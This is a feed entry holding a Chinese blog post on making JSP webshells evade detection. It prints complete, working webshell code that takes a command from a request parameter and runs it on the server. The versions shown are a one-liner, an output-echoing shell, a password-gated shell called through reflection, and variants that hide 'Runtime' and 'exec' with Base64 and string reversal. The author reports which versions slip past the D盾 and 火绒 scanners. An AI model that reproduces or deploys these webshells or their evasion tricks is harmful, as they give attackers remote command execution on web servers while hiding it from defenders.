        {
            "id": "https://ch1e.cn/2022/04/22/bypassJsp/",
            "url": "https://ch1e.cn/2022/04/22/bypassJsp/",
            "title": "Jsp Webshell免杀",
            "date_published": "2022-04-22T08:29:43.619Z",
            "content_html": "<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>之前只会写最简单webshell，今天来不系统地学习一下Jsp的webshell的免杀方式</p>\n<h1 id=\"一句话Webshell\"><a href=\"#一句话Webshell\" class=\"headerlink\" title=\"一句话Webshell\"></a>一句话Webshell</h1><p>从一句话木马角度来说，最简单的应该是</p>\n<figure class=\"highlight jsp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;% Runtime.getRuntime().exec(request.getParameter(<span class=\"string\">&quot;cmd&quot;</span>)); %&gt;</span><br></pre></td></tr></table></figure>\n\n<p>直接调用了Runtime的exec方法，并且不进行回显，适用于反弹shell，但是就没法进行一些其他的操作，并且是个WAF都会拦</p>\n<p><img src=\"https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220422164230377.png\" alt=\"image-20220422164230377\"></p>\n<p>如果说需要加上回显，应该写成如下</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;%@ page <span class=\"keyword\">import</span>=<span class=\"string\">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ page <span class=\"keyword\">import</span>=<span class=\"string\">&quot;java.io.InputStreamReader&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ page <span class=\"keyword\">import</span>=<span class=\"string\">&quot;java.io.BufferedReader&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ page language=<span class=\"string\">&quot;java&quot;</span> pageEncoding=<span class=\"string\">&quot;UTF-8&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%</span><br><span class=\"line\">    Runtime rt=Runtime.getRuntime();</span><br><span class=\"line\">    String cmd=request.getParameter(<span class=\"string\">&quot;cmd&quot;</span>);</span><br><span class=\"line\">    rt.exec(cmd);</span><br><span class=\"line\">    InputStream inputStream = rt.exec(cmd).getInputStream();</span><br><span class=\"line\">    InputStreamReader inputStreamReader=<span class=\"keyword\">new</span> InputStreamReader(inputStream);</span><br><span class=\"line\">    BufferedReader bufferedReader=<span class=\"keyword\">new</span> BufferedReader(inputStreamReader);</span><br><span class=\"line\">    String s=<span class=\"keyword\">null</span>;</span><br><span class=\"line\">    <span class=\"keyword\">while</span> ((s=bufferedReader.readLine())!=<span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">        out.println(s);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    out.println(<span class=\"string\">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class=\"line\">%&gt;</span><br></pre></td></tr></table></figure>\n\n<p>但是这样使用部分命令时还是会出现500的情况，手动修改下即可，windows下在命令前面拼接 cmd /c。</p>\n<h1 id=\"反射调用\"><a href=\"#反射调用\" class=\"headerlink\" title=\"反射调用\"></a>反射调用</h1><p>学过Java的师傅都知道可以通过反射来执行Runtime.getRuntime.exec()，所以我们只需要把上面直接执行的方式修改下即可</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;%@ page <span class=\"keyword\">import</span>=<span class=\"string\">&quot;java.io.InputStreamReader&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ page <span class=\"keyword\">import</span>=<span class=\"string\">&quot;java.io.BufferedReader&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ page <span class=\"keyword\">import</span>=<span class=\"string\">&quot;java.util.Locale&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ page <span class=\"keyword\">import</span>=<span class=\"string\">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ page <span class=\"keyword\">import</span>=<span class=\"string\">&quot;java.lang.reflect.Method&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ page language=<span class=\"string\">&quot;java&quot;</span> pageEncoding=<span class=\"string\">&quot;UTF-8&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%</span><br><span class=\"line\">    String PASSWORD = <span class=\"string\">&quot;password&quot;</span>;</span><br><span class=\"line\">    String passwd = request.getParameter(<span class=\"string\">&quot;pwd&quot;</span>);</span><br><span class=\"line\">    String cmd =request.getParameter(<span class=\"string\">&quot;cmd&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (passwd!=<span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (passwd.equals(PASSWORD)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">boolean</span> isLinux =<span class=\"keyword\">true</span>;</span><br><span class=\"line\">            String osType=System.getProperty(<span class=\"string\">&quot;os.name&quot;</span>);</span><br><span class=\"line\">            System.out.println(osType);</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (osType!=<span class=\"keyword\">null</span> &amp;&amp; osType.toLowerCase().contains(<span class=\"string\">&quot;win&quot;</span>))&#123;</span><br><span class=\"line\">                isLinux=<span class=\"keyword\">false</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            String cmds=isLinux ? <span class=\"string\">&quot;sh -c&quot;</span>+cmd :<span class=\"string\">&quot;cmd /c&quot;</span>+cmd;</span><br><span class=\"line\">            System.out.println(cmds);</span><br><span class=\"line\">            Class rt = Class.forName(<span class=\"string\">&quot;java.lang.Runtime&quot;</span>);</span><br><span class=\"line\">            java.lang.reflect.Method gr = rt.getMethod(<span class=\"string\">&quot;getRuntime&quot;</span>);</span><br><span class=\"line\">            java.lang.reflect.Method ex = rt.getMethod(<span class=\"string\">&quot;exec&quot;</span>, String.class);</span><br><span class=\"line\">            Process process = (Process) ex.invoke(gr.invoke(<span class=\"keyword\">null</span>), cmds);</span><br><span class=\"line\">            java.io.InputStream in = process.getInputStream();</span><br><span class=\"line\">            out.print(<span class=\"string\">&quot;&lt;pre&gt;&quot;</span>);</span><br><span class=\"line\">            java.io.InputStreamReader resultReader = <span class=\"keyword\">new</span> java.io.InputStreamReader(in);</span><br><span class=\"line\">            java.io.BufferedReader stdInput = <span class=\"keyword\">new</span> java.io.BufferedReader(resultReader);</span><br><span class=\"line\">            String s = <span class=\"keyword\">null</span>;</span><br><span class=\"line\">            <span class=\"keyword\">while</span> ((s = stdInput.readLine()) != <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">                out.println(s);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            out.print(<span class=\"string\">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">%&gt;</span><br></pre></td></tr></table></figure>\n\n<p>这里我还增加了判断linux和windows的功能，还加了密码以及404页面，增加隐蔽性，此时拿D盾已经扫描不出来了，但是火绒还是可以检测，其实这反射调用也是比较简单的思路，</p>\n<p><img src=\"https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220422165152598.png\" alt=\"image-20220422165152598\"></p>\n<p><img src=\"https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220422165755175.png\" alt=\"image-20220422165755175\"></p>\n<h1 id=\"编码处理\"><a href=\"#编码处理\" class=\"headerlink\" title=\"编码处理\"></a>编码处理</h1><p>一些WAF啥的可能是检测一些关键词的吧，比如Runtime，Proccess啥的，我们可以对他们进行一系列编码然后解码操作，这样的话也有可能绕过WAF,下面以Base64为例</p>\n<figure class=\"highlight jsp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;%@ page <span class=\"keyword\">import</span>=<span class=\"string\">&quot;java.io.InputStreamReader&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ page <span class=\"keyword\">import</span>=<span class=\"string\">&quot;java.io.BufferedReader&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ page <span class=\"keyword\">import</span>=<span class=\"string\">&quot;java.util.Locale&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ page <span class=\"keyword\">import</span>=<span class=\"string\">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ page <span class=\"keyword\">import</span>=<span class=\"string\">&quot;java.lang.reflect.Method&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ page <span class=\"keyword\">import</span>=<span class=\"string\">&quot;java.util.Base64&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ page <span class=\"keyword\">import</span>=<span class=\"string\">&quot;sun.misc.BASE64Decoder&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ page language=<span class=\"string\">&quot;java&quot;</span> pageEncoding=<span class=\"string\">&quot;UTF-8&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%</span><br><span class=\"line\">    String PASSWORD = <span class=\"string\">&quot;password&quot;</span>;</span><br><span class=\"line\">    String passwd = request.getParameter(<span class=\"string\">&quot;pwd&quot;</span>);</span><br><span class=\"line\">    String cmd =request.getParameter(<span class=\"string\">&quot;cmd&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (passwd!=<span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (passwd.equals(PASSWORD)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">boolean</span> isLinux =<span class=\"keyword\">true</span>;</span><br><span class=\"line\">            String osType=System.getProperty(<span class=\"string\">&quot;os.name&quot;</span>);</span><br><span class=\"line\">            System.out.println(osType);</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (osType!=<span class=\"keyword\">null</span> &amp;&amp; osType.toLowerCase().contains(<span class=\"string\">&quot;win&quot;</span>))&#123;</span><br><span class=\"line\">                isLinux=<span class=\"keyword\">false</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            String cmds=isLinux ? <span class=\"string\">&quot;sh -c &quot;</span>+cmd :<span class=\"string\">&quot;cmd /c &quot;</span>+cmd;</span><br><span class=\"line\">            System.out.println(cmds);</span><br><span class=\"line\">            BASE64Decoder base64Decoder=<span class=\"keyword\">new</span> BASE64Decoder();</span><br><span class=\"line\">            Class rt = Class.forName(<span class=\"keyword\">new</span> String(base64Decoder.decodeBuffer(<span class=\"string\">&quot;amF2YS5sYW5nLlJ1bnRpbWU=&quot;</span>)));</span><br><span class=\"line\">            java.lang.reflect.Method gr = rt.getMethod(<span class=\"keyword\">new</span> String(base64Decoder.decodeBuffer(<span class=\"string\">&quot;Z2V0UnVudGltZQ==&quot;</span>)));</span><br><span class=\"line\">            java.lang.reflect.Method ex = rt.getMethod(<span class=\"keyword\">new</span> String(base64Decoder.decodeBuffer(<span class=\"string\">&quot;ZXhlYw==&quot;</span>)), String.class);</span><br><span class=\"line\">            Process process = (Process) ex.invoke(gr.invoke(<span class=\"keyword\">null</span>), cmds);</span><br><span class=\"line\">            java.io.InputStream in = process.getInputStream();</span><br><span class=\"line\">            out.print(<span class=\"string\">&quot;&lt;pre&gt;&quot;</span>);</span><br><span class=\"line\">            java.io.InputStreamReader resultReader = <span class=\"keyword\">new</span> java.io.InputStreamReader(in);</span><br><span class=\"line\">            java.io.BufferedReader stdInput = <span class=\"keyword\">new</span> java.io.BufferedReader(resultReader);</span><br><span class=\"line\">            String s = <span class=\"keyword\">null</span>;</span><br><span class=\"line\">            <span class=\"keyword\">while</span> ((s = stdInput.readLine()) != <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">                out.println(s);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            out.print(<span class=\"string\">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">%&gt;</span><br></pre></td></tr></table></figure>\n\n<p>但是好像，和直接反射调用比，这个反而被D盾标为可疑文件了，很奇怪哈哈。</p>\n<h1 id=\"字符串反转\"><a href=\"#字符串反转\" class=\"headerlink\" title=\"字符串反转\"></a>字符串反转</h1><p>字符串反转和编码处理也是类似，对反射调用的内容进行了一个处理，让WAF没法匹配关键字</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;%@ page <span class=\"keyword\">import</span>=<span class=\"string\">&quot;java.io.InputStreamReader&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ page <span class=\"keyword\">import</span>=<span class=\"string\">&quot;java.io.BufferedReader&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ page <span class=\"keyword\">import</span>=<span class=\"string\">&quot;java.util.Locale&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ page <span class=\"keyword\">import</span>=<span class=\"string\">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ page <span class=\"keyword\">import</span>=<span class=\"string\">&quot;java.lang.reflect.Method&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ page <span class=\"keyword\">import</span>=<span class=\"string\">&quot;java.util.Base64&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ page <span class=\"keyword\">import</span>=<span class=\"string\">&quot;sun.misc.BASE64Decoder&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ page language=<span class=\"string\">&quot;java&quot;</span> pageEncoding=<span class=\"string\">&quot;UTF-8&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%!</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> String <span class=\"title\">re</span><span class=\"params\">(String str)</span></span>&#123;</span><br><span class=\"line\">        String re = <span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">int</span> length = str.length();</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; length; i++)&#123;</span><br><span class=\"line\">            re = str.charAt(i) + re;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> re;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">%&gt;</span><br><span class=\"line\">&lt;%</span><br><span class=\"line\">    String PASSWORD = <span class=\"string\">&quot;password&quot;</span>;</span><br><span class=\"line\">    String passwd = request.getParameter(<span class=\"string\">&quot;pwd&quot;</span>);</span><br><span class=\"line\">    String cmd =request.getParameter(<span class=\"string\">&quot;cmd&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (passwd!=<span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (passwd.equals(PASSWORD)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">boolean</span> isLinux =<span class=\"keyword\">true</span>;</span><br><span class=\"line\">            String osType=System.getProperty(<span class=\"string\">&quot;os.name&quot;</span>);</span><br><span class=\"line\">            System.out.println(osType);</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (osType!=<span class=\"keyword\">null</span> &amp;&amp; osType.toLowerCase().contains(<span class=\"string\">&quot;win&quot;</span>))&#123;</span><br><span class=\"line\">                isLinux=<span class=\"keyword\">false</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            String cmds=isLinux ? <span class=\"string\">&quot;sh -c &quot;</span>+cmd :<span class=\"string\">&quot;cmd /c &quot;</span>+cmd;</span><br><span class=\"line\">            System.out.println(cmds);</span><br><span class=\"line\">            BASE64Decoder base64Decoder=<span class=\"keyword\">new</span> BASE64Decoder();</span><br><span class=\"line\">            Class rt = Class.forName(re(<span class=\"string\">&quot;emitnuR.gnal.avaj&quot;</span>));</span><br><span class=\"line\">            java.lang.reflect.Method gr = rt.getMethod(re(<span class=\"string\">&quot;emitnuRteg&quot;</span>));</span><br><span class=\"line\">            java.lang.reflect.Method ex = rt.getMethod(re(<span class=\"string\">&quot;cexe&quot;</span>), String.class);</span><br><span class=\"line\">            Process process = (Process) ex.invoke(gr.invoke(<span class=\"keyword\">null</span>), cmds);</span><br><span class=\"line\">            java.io.InputStream in = process.getInputStream();</span><br><span class=\"line\">            out.print(<span class=\"string\">&quot;&lt;pre&gt;&quot;</span>);</span><br><span class=\"line\">            java.io.InputStreamReader resultReader = <span class=\"keyword\">new</span> java.io.InputStreamReader(in);</span><br><span class=\"line\">            java.io.BufferedReader stdInput = <span class=\"keyword\">new</span> java.io.BufferedReader(resultReader);</span><br><span class=\"line\">            String s = <span class=\"keyword\">null</span>;</span><br><span class=\"line\">            <span class=\"keyword\">while</span> ((s = stdInput.readLine()) != <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">                out.println(s);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            out.print(<span class=\"string\">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">%&gt;</span><br></pre></td></tr></table></figure>\n\n<p>但是其实这个也是被D盾标为可疑文件，我的认为是这种查杀工具如果发现你有加解密或者对字符串进行变换的操作，就自动标为可疑文件，因此还是得换种方法</p>\n",
